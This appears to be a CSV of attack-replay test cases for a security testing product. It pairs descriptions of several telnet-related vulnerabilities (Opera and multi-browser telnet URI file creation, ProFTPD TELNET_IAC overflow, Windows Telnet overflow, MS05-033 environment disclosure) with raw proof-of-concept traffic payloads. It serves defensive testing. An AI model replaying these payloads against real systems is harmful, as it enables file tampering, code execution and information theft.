XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation.xml,Opera Telnet URI Handler File Creation,Opera Software ASA&apos;s Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser&apos;s user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user&apos;s system.,HTTP,TCP,"GET /poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwave-flash, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 5.01||3B || Windows NT 5.0)||0D 0A ||Host||3A || 10.2.1.130||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20040520-01_Opera_Telnet_URI_Handler_File_Creation.xml,Opera Telnet URI Handler File Creation,Opera Software ASA&apos;s Opera Web browser is vulnerable to an attack of telnet URI handler. An attacker can invoke telnet with a trace file name as argument by requesting an URI address to opera web browser. The supplied trace file then can be created on the host of web browser&apos;s user. Therefore it is possible for the attacker to create malicious file which could be harmful to the user&apos;s system.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Fri, 21 May 2004 19||3A ||41||3A ||14 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Fri, 21 May 2004 16||3A ||59||3A ||59 GMT||0D 0A ||ETag||3A || ||22 ||123c75-bd-38bd41c0||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 189||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A 0D 0A ||<head>||0D 0A ||<title>Opera Telnet URI handler File Creation Vulnerability POC</title>||0D 0A ||</head>||0D 0A 0D 0A ||<body>||0D 0A 0D 0A ||<p><a href=||22 ||telnet||3A ||//-fcrackfile||22 ||>OPERA CRACK</a></p>||0D 0A 0D 0A ||</body>||0D 0A 0D 0A ||</html>||0D 0A||"
﻿FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability,"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter &quot;-&quot; characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system.",HTTP,TCP,"GET /telnet_exploit.html HTTP/1.1||0D 0A ||Host||3A || 10.2.1.101||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.0||3B || en-US||3B || rv||3A ||1.5) Gecko/20031007||0D 0A ||Accept||3A || application/x-shockwave-flash,text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,image/jpeg,image/gif||3B ||q=0.2,*/*||3B ||q=0.1||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20040527-02_Multiple_Browsers_Telnet_URI_Handler_File_Manipulation_Vulnerability.xml,Multiple Browsers Telnet URI Handler File Manipulation Vulnerability,"There is a malformed URI vulnerability that affects various web-browsers. There is insufficient input validation for telnet URI (e.g., telnet://hostname). Namely, the affected products do not validate or filter &quot;-&quot; characters at the beginning of host-names. Telnet software activated by the browsers treat these as command-line options. As such, a malicious attacker may be able to compromise the target machine. Specifically, it may be possible to create or truncate a file on the target system.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Thu, 27 May 2004 18||3A ||51||3A ||12 GMT||0D 0A ||Server||3A || Apache/2.0.48 (Fedora)||0D 0A ||Last-Modified||3A || Thu, 27 May 2004 18||3A ||48||3A ||56 GMT||0D 0A ||ETag||3A || ||22 ||43c011-db-716c3600||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 219||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=UTF-8||0D 0A 0D 0A ||<html>||0D 0A ||<head>||0D 0A ||<title>Telnet URI handler File Creation Vulnerability POC </title>||0D 0A ||</head>||0D 0A ||<body>||0D 0A ||<p><a href=||22 ||telnet||3A ||//-fcrackfile||22 ||>Windows</a></p>||0D 0A ||<p><a href=||22 ||telnet||3A ||//-ncrackfile||22 ||>Linux</a></p>||0D 0A ||</body>||0D 0A ||</html>||0D 0A||"
﻿FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||FF ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,220 FTP Server ready.||0D 0A||
﻿TSL20150113-14_Microsoft_Windows_Telnet_Service_Buffer_Overflow.xml,Microsoft Windows Telnet Service Buffer Overflow,A buffer overflow vulnerability exists in Microsoft Windows Telnet service. The vulnerability is due to an input validation error in processing Telnet messages. A remote attacker can exploit this vulnerability by sending crafted Telnet messages to a vulnerable server. Successful exploitation could possibly results in arbitrary code execution in the security context of the &quot;Local Service&quot; account.  Tester should set variable $destPort to 23 before test.,Telnet,TCP,||FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6 FF F1 FF F6||
﻿ms05-033_telnet.xml,MS05-033 Windows Telnet Environment Variable Disclosure,This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,||FF FD 03 FF FB 18 FF FB 1F FF FB || ||FF FB ||!||FF FB 22 FF FB ||'||FF FD 05 FF FB ||#
ms05-033_telnet.xml,MS05-033 Windows Telnet Environment Variable Disclosure,This threat attempts to lift every environment variable available with Microsoft Windows XP via the telnet client.  The telnet client can caused to launch via a hyperlink embedded in a web page or through social engineering causing the user to launch it.  This can be used to learn about other potential vulnerabilities in the user's system.  Telnet typically listens on port 23.  This threat is a client attack that comes from the virtual server.,Telnet,TCP,||FF FA ||'||01 03 ||USERPROFILE||FF F0 FF FA ||'||01 03 ||ALLUSERSPROFILE||FF F0 FF FA ||'||01 03 ||APPDATA||FF F0 FF FA ||'||01 03 ||CLIENTNAME||FF F0 FF FA ||'||01 03 ||CommonProgramFiles||FF F0 FF FA ||'||01 03 ||COMPUTERNAME||FF F0 FF FA ||'||01 03 ||ComSpec||FF F0 FF FA ||'||01 03 ||HOMEDRIVE||FF F0 FF FA ||'||01 03 ||HOMEPATH||FF F0 FF FA ||'||01 03 ||LOGONSERVER||FF F0 FF FA ||'||01 03 ||NUMBER_OF_PROCESSORS||FF F0 FF FA ||'||01 03 ||OS||FF F0 FF FA ||'||01 03 ||Path||FF F0 FF FA ||'||01 03 ||PROCESSOR_ARCHITECTURE||FF F0 FF FA ||'||01 03 ||PROCESSOR_IDENTIFIER||FF F0 FF FA ||'||01 03 ||PROCESSOR_LEVEL||FF F0 FF FA ||'||01 03 ||PROCESSOR_REVISION||FF F0 FF FA ||'||01 03 ||ProgramFiles||FF F0 FF FA ||'||01 03 ||PROMPT||FF F0 FF FA ||'||01 03 ||SESSIONNAME||FF F0 FF FA ||'||01 03 ||SystemDrive||FF F0 FF FA ||'||01 03 ||SystemRoot||FF F0 FF FA ||'||01 03 ||TEMP||FF F0 FF FA ||'||01 03 ||TMP||FF F0 FF FA ||'||01 03 ||USERDOMAIN||FF F0 FF FA ||'||01 03 ||windir||FF F0||
